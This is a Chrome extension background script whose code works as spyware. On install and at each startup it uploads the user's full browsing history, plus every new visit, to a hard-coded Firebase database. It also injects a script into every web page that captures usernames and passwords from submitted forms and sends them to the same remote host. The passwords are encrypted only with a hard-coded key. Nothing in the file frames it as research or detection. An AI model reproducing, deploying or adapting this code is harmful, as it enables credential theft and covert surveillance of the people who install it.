const FB_BASE = 'https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app';
const SEASON = 'season2025';

(async function bootstrap() {
  console.log('Background script initialized');
  let rawEmail = 'anonymous@demo.com';
  try {
    const resp = await fetch(chrome.runtime.getURL('config.json'));
    if (!resp.ok) {
      throw new Error(`HTTP error: ${resp.status} ${resp.statusText}`);
    }
    const text = await resp.text();
    console.log('Raw config.json content:', text);
    const cfg = JSON.parse(text);
    if (cfg.userEmail && typeof cfg.userEmail === 'string' && cfg.userEmail.includes('@')) {
      rawEmail = cfg.userEmail.trim();
      console.log('Email loaded from config.json:', rawEmail);
    } else {
      console.error('Invalid or missing userEmail in config.json:', cfg);
    }
  } catch (e) {
    console.error('Failed to load config.json:', e.message);
  }

  const emailKey = encodeURIComponent(rawEmail.replace(/\./g, ','));
  console.log('Using Firebase emailKey:', emailKey);

  initLogger(emailKey);
})();

function formatToMinute(ms) {
  const d = new Date(ms);
  const YYYY = d.getUTCFullYear();
  const MM = String(d.getUTCMonth() + 1).padStart(2, '0');
  const DD = String(d.getUTCDate()).padStart(2, '0');
  const hh = String(d.getUTCHours()).padStart(2, '0');
  const mm = String(d.getUTCMinutes()).padStart(2, '0');
  return `${YYYY}-${MM}-${DD}T${hh}:${mm}Z`;
}

async function encryptData(data, key) {
  try {
    const enc = new TextEncoder();
    const encodedKey = enc.encode(key);
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const cryptoKey = await crypto.subtle.importKey(
      'raw', encodedKey, { name: 'AES-GCM' }, false, ['encrypt']
    );
    const encrypted = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv }, cryptoKey, enc.encode(data)
    );
    return { iv: Array.from(iv), data: Array.from(new Uint8Array(encrypted)) };
  } catch (e) {
    console.error('Encryption failed:', e);
    return data;
  }
}

function contentScript() {
  console.log('Content script injected on', window.location.href);
  document.addEventListener('submit', (event) => {
    console.log('Form submitted on', window.location.href);
    const form = event.target;
    let username = '';
    let password = '';

    const inputs = form.querySelectorAll('input');
    inputs.forEach(input => {
      if (
        input.type === 'text' ||
        input.type === 'email' ||
        input.name.toLowerCase().includes('user') ||
        input.name.toLowerCase().includes('email') ||
        input.name.toLowerCase().includes('login') ||
        input.id.toLowerCase().includes('user') ||
        input.id.toLowerCase().includes('email') ||
        input.placeholder.toLowerCase().includes('user') ||
        input.placeholder.toLowerCase().includes('email')
      ) {
        username = input.value;
      }
      if (input.type === 'password') {
        password = input.value;
      }
    });

    if (username || password) {
      console.log('Captured credentials:', { url: window.location.href, username, password });
      chrome.runtime.sendMessage({
        type: 'credentials',
        data: {
          url: window.location.href,
          username: username,
          password: password,
          timestamp: new Date().toISOString()
        }
      });
    }
  });
}

function initLogger(emailKey) {
  chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url && tab.url.startsWith('http')) {
      chrome.scripting.executeScript({
        target: { tabId: tabId },
        func: contentScript
      }).catch(err => console.error('Script injection failed:', err));
    }
  });

  async function fullSync() {
    chrome.history.search({ text: '', startTime: 0, maxResults: 1e6 }, items => {
      const byMinute = {};
      items.forEach(item => {
        byMinute[formatToMinute(item.lastVisitTime)] = item;
      });
      fetch(
        `${FB_BASE}/history/${SEASON}/${emailKey}/visited.json`,
        { method: 'PUT', body: JSON.stringify(byMinute) }
      ).then(response => {
        if (!response.ok) console.error('History sync failed:', response.statusText);
      }).catch(console.error);
    });
  }

  chrome.runtime.onInstalled.addListener(fullSync);
  chrome.runtime.onStartup.addListener(fullSync);

  chrome.history.onVisited.addListener(({ url, lastVisitTime }) => {
    const ts = formatToMinute(lastVisitTime);
    chrome.history.search(
      { text: url, startTime: lastVisitTime - 1, maxResults: 1 },
      results => {
        if (!results[0]) return;
        const fullItem = results[0];
        fullItem.timestamp = ts;
        fetch(
          `${FB_BASE}/history/${SEASON}/${emailKey}/visited/${encodeURIComponent(ts)}.json`,
          { method: 'PUT', body: JSON.stringify(fullItem) }
        ).then(response => {
          if (!response.ok) console.error('URL sync failed:', response.statusText);
        }).catch(console.error);
      }
    );
  });

  chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
    if (message.type === 'credentials') {
      console.log('Received credentials from', message.data.url);
      const { url, username, password, timestamp } = message.data;
      const ts = formatToMinute(new Date(timestamp).getTime());
      const encryptedPassword = await encryptData(password, 'your-secret-key-2025');
      const credentialData = { url, username, encryptedPassword, timestamp };

      fetch(
        `${FB_BASE}/credentials/${SEASON}/${emailKey}/${encodeURIComponent(ts)}.json`,
        { method: 'PUT', body: JSON.stringify(credentialData) }
      ).then(response => {
        if (!response.ok) console.error('Credential save failed:', response.statusText);
      }).catch(console.error);
    }
  });
}